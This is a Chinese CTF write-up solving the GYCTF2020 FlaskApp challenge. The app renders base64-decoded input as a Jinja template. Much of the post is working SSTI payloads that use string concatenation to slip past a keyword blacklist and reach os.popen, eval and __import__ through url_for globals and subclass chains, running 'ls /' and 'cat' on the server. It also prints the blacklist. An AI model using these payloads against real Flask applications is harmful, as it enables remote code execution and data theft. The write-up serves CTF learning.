---
date: 2026-11-01 18:40:00
slug: gyctf2020-flaskapp-ssti
categories:
  - Python
  - Flask
  - SSTI
---

# [GYCTF2020] FlaskApp — 一张黑名单，两条链

> **题目类型**：Web — Flask SSTI（有过滤）
>
> **题目地址**：BUUCTF / ctf2 复刻环境
>
> **Flag**：`CTF2{dba20aea-1830-4ecc-b055-b73a1d9ba4fa}`

---

## 题目概述

进入靶场发现是一个加解密的方式，先随便加密解密试试。

这里发现，**解密时会把解密的内容打印出来**——那就有戏了。

---

## 解题过程

### Step 1：`{{7*7}}` 返回 `nonono`

先试一下 `{{7*7}}`，返回的是 `nonono`。

**这个 `nonono` 就明确了我们的思路是对的，只不过有东西被过滤了。**

接着我去试，发现被过滤的有这些：

```text
*  eval  os  subprocess  popen  import  system  request  flag
```

**（是子串匹配、不分大小写。所以 `host` 这种词也会中招 —— 里面含 `os`。）**

**能过的是：**`config` `self` `session` `url_for` `lipsum` `globals` `builtins` `class` `open` `cat` `read` `+`

**注意 `+` 没被过滤**，所以后面全靠拼接绕过。

### Step 2：确认是 Flask，先试短路

试试 `{{config}}`，出来了 Flask 的配置对象 —— 确认是 Flask（其实题名也提示了）。

那先试试 `url_for` 能不能正常使用，结论是可行的：

```text
{{url_for}}   →  <function url_for at 0x...>
```

### Step 3：这里我卡住了 —— 页面没回显，Net 里看到重定向

接着再试 `{{url_for.__globals__}}`，**但是页面没有回显**，看了一下 Net 发现被重定向了。

**这里我实在不明白原因。**BP 抓包抓下来的响应里，session 里有一大串数据，但是解码不出来。

> **后来搞明白了，记在这里：**
>
> 这题用的是 **POST-Redirect-GET** 模式：
>
> ```python
> @app.route('/decode', methods=['GET','POST'])
> def decode():
>     if request.method == 'GET':
>         res = session.pop('res', '')
>         return render_template('decode.html', res=res)
>     else:
>         res = render_template_string(base64.b64decode(request.form['text']).decode())
>         session['res'] = res          # 结果塞进 session（flash）
>         return redirect('/decode')    # 302
> ```
>
> **所以：**
>
> ```text
> ① 你看到的"结果"在重定向之后的 GET 页面里，不在 302 那个响应里
> ② 那一大串 cookie 就是 session —— 结果（可能很长）就装在里面
> ③ 结果越长，cookie 越大
> ```
>
> **我看到的"没回显"，其实是在看 302 的响应体（内容是 `Redirecting...`）。**跟过滤无关，是流程问题。

### Step 4：短路打通

`url_for.__globals__` 本身是通的，卡住的是**再往下取 `['os']`** —— 因为 `os` 在名单里。

**但 `+` 没被过滤，所以可以拼：**

```text
{{url_for.__globals__['o'+'s']}}
→  <module 'os' from '/usr/local/lib/python3.7/os.py'>
```

这个又能正常回显了。

### Step 5：先找文件名

`popen` 被拦，所以也拼一下；然后**先 `ls /`**，因为我们还不知道 flag 叫什么：

```text
{{url_for.__globals__['o'+'s']['p'+'open']('ls /').read()}}
```

```text
app  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc
root  run  sbin  srv  sys  this_is_the_flag.txt  tmp  usr  var
```

**根目录下有个 `this_is_the_flag.txt`。文件名是这一步才知道的。**

### Step 6：读出来

注意 `flag` 这个词也被拦，所以路径也要拼（`'this_is_the_fl'` + `'ag.txt'`）：

```text
{{url_for.__globals__['o'+'s']['p'+'open']('cat /this_is_the_fl'+'ag.txt').read()}}
```

```text
CTF2{dba20aea-1830-4ecc-b055-b73a1d9ba4fa}
```

### Step 7：换一条路（长链）

短路能通，是因为 Flask 注入了 `url_for`。**换个环境把 `url_for` 删了，这条路就断。**所以再走一遍长链——从字面量 `''` 开始爬。

```text
{{''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first}}
→  <class '_py_warnings.catch_warnings'>
```

**（`__name__` 是四个下划线；`name` 不出东西。另外 `equalto` 要加引号，不加会报 `no test named Undefined`。）**

然后接 `['__init__']['__globals__']['__builtins__']`，拿到 builtins 的 dict。

**接下来我一开始想用 `eval`，直接给出去的版本报了 `nonono`，我不知道是哪个还被过滤了。**

> **答案：是 `"os"`。**
>
> 我把 `import` 拆了、`popen` 拆了、`eval` 拆了，**唯独把 `"os"` 原样写在了字符串里** —— 那两个字面量照样会被匹配。
>
> 拆开之后：
>
> ```text
> ('__imp'+'ort__("o"+"s").pop'+'en("ls /").read()')
> ```

**完整的一条：**

```text
{{(''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first)['__init__']['__globals__']['__builtins__']['eva'+'l']('__imp'+'ort__("o"+"s").pop'+'en("cat /this_is_the_fl"+"ag.txt").read()')}}
```

**也是先 `ls /` 再 `cat`，一样拿不到名字就没法读。**

---

## 解题思路总结

```text
加解密功能 → 解密的结果被当模板渲染
  → {{7*7}} 回 nonono → 有黑名单，但思路对
    → {{config}} 确认 Flask
      → url_for 能用 → 短路：url_for.__globals__
        → 卡在 ['os']（os 被拦）→ 拼成 ['o'+'s']
          → ls / 找到 this_is_the_flag.txt
            → cat 它（flag 也被拦，路径也拼）→ flag
              → 再走一遍长链验证：'' → subclasses → catch_warnings
                → __builtins__ → eval（import/os/popen 全要拆）→ flag
```

### 漏洞原理

**① 解密结果被当成模板源码**

```python
res = render_template_string(base64.b64decode(text).decode())
```

**base64 只是把输入换了个形式，并没有让它变成"数据"。解密之后它照样进模板引擎求值。**

**② 黑名单是"词"，绕过靠"拼接"**

过滤器查的是**你原文里有没有那串字母**；Jinja 求值时会把 `+` 算掉，得到完整字符串。

```text
原文：'o'+'s'      → 不含 os
求值：'os'          → 才是真正的属性名
```

**过滤看"字面"，执行看"结果"——这两者的差，就是绕过空间。**

**③ 长链和短链的区别只在入口**

短链从**框架注入的名字**（`url_for`）出发，长链从**字面量**（`''`）出发。终点一样，都是拿到 `__builtins__`。

### 关键知识点

| 知识点 | 说明 |
|---|---|
| 黑名单（本题） | `*` `eval` `os` `popen` `system` `import` `request` `subprocess` `flag`，子串匹配 |
| `+` 拼接 | `'o'+'s'` 绕 `os`；`'this_is_the_fl'+'ag.txt'` 绕 `flag` |
| 子串陷阱 | `host` 里含 `os` 也会被拦——拆词时每一段都要检查 |
| POST-Redirect-GET | 结果存 session，302 的响应体里没有结果 |
| 结果越长 cookie 越大 | 因为结果被塞进了 session |
| `\|selectattr` | 按属性名筛，代替"数下标"跨环境稳定 |
| `'__name__'` vs `'name'` | 前者才有值，后者筛不出东西 |
| `'equalto'` 要加引号 | 不加时报 `no test named Undefined` |
| 双层拆分 | `eval` 那条：Jinja 层拆一次，Python 源码再拆一次 |
| `open` vs `eval` | `open` 只读文件，不碰 shell，名单里也没它——比 `eval` 省事 |

---

??? note "两条链的完整 payload（实测）"

    **短路（`url_for`）**

    ```jinja
    {{url_for.__globals__['o'+'s']['p'+'open']('ls /').read()}}
    {{url_for.__globals__['o'+'s']['p'+'open']('cat /this_is_the_fl'+'ag.txt').read()}}
    ```

    **长链（`subclasses` + `eval`，双层拆分）**

    ```jinja
    {{(''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first)['__init__']['__globals__']['__builtins__']['eva'+'l']('__imp'+'ort__("o"+"s").pop'+'en("ls /").read()')}}
    ```

    **长链（`subclasses` + `open`，只有一层拆分，更省事）**

    ```jinja
    {{(''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first)['__init__']['__globals__']['__builtins__']['open']('/this_is_the_fl'+'ag.txt').read()}}
    ```

    **注意：`open` 版必须先知道文件名（靠 `ls /`），而且不能执行命令，只能读文件。**

---

??? note "两道黑名单自查（我踩过的）"

    **① 以为 `url_for.__globals__` 被拦了**

    其实是 302 重定向，响应体里本来就没有结果。**先分清"没执行"和"结果在下一页"。**

    **② `eval` 那条报 `nonono`，找不到是哪个词**

    **逐个测试是最快的办法**：把可疑的词单独包成 `{{'xxx'}}` 发一遍，看哪个返回 `nonono`。

    我拆了 `import`、`popen`、`eval`，就是没拆 `"os"`。
